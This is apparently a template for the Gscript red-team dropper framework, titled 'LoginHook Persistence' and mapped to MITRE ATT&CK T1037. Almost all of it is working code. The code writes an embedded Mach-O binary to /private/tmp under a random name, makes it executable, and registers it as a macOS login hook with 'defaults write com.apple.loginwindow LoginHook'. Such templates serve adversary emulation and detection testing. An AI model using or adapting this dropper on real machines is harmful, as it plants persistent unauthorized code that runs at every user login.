// Example gscript template
// Title: LoginHook Persistence
// Author: ahhh
// Purpose: Drop a sample binary and persist it using a default Login Hook
// Gscript version: 0.1.2
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1037

//priority:90
//timeout:150
//import:/private/tmp/example.macho

function BeforeDeploy() {
  LogInfo("starting execution of Login Hook Persistence");
  return true; 
}

function Deploy() {
  // Drop the sample
  var example = Asset("example.macho");
  var name = "";
  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  for (var i = 0; i < 5; i++)
    name += possible.charAt(Math.floor(Math.random() * possible.length));
  name = "/private/tmp/"+name;
  WriteFile(name, example.fileData, 0755);
  LogInfo("dropped the example binary here: "+name);
  
  // Persist the sample
  ExecuteCommand("defaults", ["write", "com.apple.loginwindow", "LoginHook", name]);
  console.log("Persisted binary using com.apple.loginwindow LoginHook");

  return true;
}

function AfterDeploy() {
  LogInfo("done, deployed binary with Login Hook persistence");
  return true;
}